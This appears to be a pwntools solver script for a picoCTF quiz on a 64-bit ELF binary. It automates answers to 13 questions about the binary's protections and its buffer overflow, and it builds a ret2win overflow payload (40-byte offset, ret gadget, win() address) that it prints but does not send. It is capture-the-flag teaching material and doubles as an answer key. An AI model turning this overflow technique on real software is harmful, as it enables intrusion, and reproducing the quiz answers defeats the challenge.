#!/usr/bin/env python3
"""
picoCTF - ELF Binary Analysis Quiz
Solver script that automates answering all 13 questions.

Usage: python3 solve.py

All answers derived from:
  - file vuln         → arch, linking, stripped status
  - checksec vuln     → NX, PIE, canary, RELRO
  - IDA / objdump     → buffer size, fgets size, win() address, overflow math
  - assembly analysis → stack layout, offset calculations
"""
from pwn import *

context.log_level = 'warning'

# ── Binary Analysis ────────────────────────────────────────────────────────────
elf = ELF('./vuln', checksec=False)

# win() is at a fixed address (no PIE): 0x401176
win_addr = elf.symbols['win']

# Stack layout of vuln():
#   sub rsp, 0x20     → 32 bytes allocated
#   s = byte ptr -20h → buffer at rbp-0x20
#   saved RBP         → rbp+0x00 (8 bytes)
#   return address    → rbp+0x08
#   OFFSET = 0x20 + 8 = 40 bytes
OFFSET = 40

# ret gadget for 16-byte stack alignment (required by system() on x86-64)
# Without this, movaps in system() will SIGSEGV
rop        = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

# Final ret2win payload (constructed but only needed if server asked for it)
payload = b'A' * OFFSET + p64(ret_gadget) + p64(win_addr)

print(f"[*] win()       = {hex(win_addr)}")
print(f"[*] ret gadget  = {hex(ret_gadget)}")
print(f"[*] OFFSET      = {OFFSET}")
print(f"[*] payload len = {len(payload)} bytes (max fgets: {0x90})")

# ── Remote Connection ──────────────────────────────────────────────────────────
io = remote('lonely-island.picoctf.net', 60676)

# Skip the banner / instructions block
io.recvuntil(b'[*] Question number 0x1:')

# ── State management ───────────────────────────────────────────────────────────
# After a WRONG answer the server re-displays the question ending with >>
# so the next call must NOT call recvuntil(>>) again.
needs_prompt = True

def answer_question(ans, qnum):
    global needs_prompt
    if needs_prompt:
        io.recvuntil(b'>> ')          # wait for input prompt
    needs_prompt = True

    io.sendline(ans.encode() if isinstance(ans, str) else ans)

    response = io.recvuntil(
        [b'Correct', b'Wrong', b'picoCTF', b'flag'],
        timeout=10
    )
    decoded    = response.decode(errors='replace')
    correct    = b'Correct'  in response
    wrong      = b'Wrong'    in response
    flag_found = b'picoCTF'  in response

    status = ('CORRECT' if correct else
              'WRONG'   if wrong    else
              'FLAG'    if flag_found else 'UNKNOWN')
    print(f"Q{qnum:2d} {repr(ans)[:50]:52s} → {status}")

    if wrong:
        retry = io.recvuntil(b'>> ', timeout=5)
        needs_prompt = False   # >> already consumed
        print(f"  [!] Actual Q: {retry.decode(errors='replace').strip()}")

    if flag_found:
        print("\n[+] FLAG:")
        print(decoded)
        extra = io.recvall(timeout=3)
        print(extra.decode(errors='replace'))

    return correct or flag_found

# ── 13 Quiz Answers ────────────────────────────────────────────────────────────

# Q0x1: ELF bitness — `file vuln` → "ELF 64-bit"
answer_question('64-bit', 1)

# Q0x2: Linking — `file vuln` → "dynamically linked"
answer_question('dynamic', 2)

# Q0x3: Stripped — `file vuln` → "not stripped" / checksec → "Stripped: No"
answer_question('not stripped', 3)

# Q0x4: Buffer size — vuln.c: char buffer[0x15] / IDA: s = byte ptr -20h
answer_question('0x15', 4)

# Q0x5: fgets read size — vuln.asm: mov esi, 90h
answer_question('0x90', 5)

# Q0x6: Buffer overflow? — 0x90 bytes read into 0x15 buffer → yes
answer_question('yes', 6)

# Q0x7: Responsible C function — vuln.c / vuln.asm: call _fgets
answer_question('fgets', 7)

# Q0x8: Uncalled function — win() exists but main() only calls vuln()
answer_question('win', 8)

# Q0x9: Attack category — overflow overwriting return address
answer_question('buffer overflow', 9)

# Q0xa: Overflow bytes — 0x90 - 0x15 = 0x7b
answer_question('0x7b', 10)

# Q0xb: Enabled protection — checksec → NX enabled (no canary, no PIE)
answer_question('NX', 11)

# Q0xc: NX bypass technique — Return Oriented Programming
answer_question('ROP', 12)

# Q0xd: Address of win() — no PIE, fixed at 0x401176
answer_question(hex(win_addr), 13)

# ── Collect flag ───────────────────────────────────────────────────────────────
print("\n[*] All questions done - waiting for flag...")
remaining = io.recvall(timeout=5)
print(remaining.decode(errors='replace'))

io.close()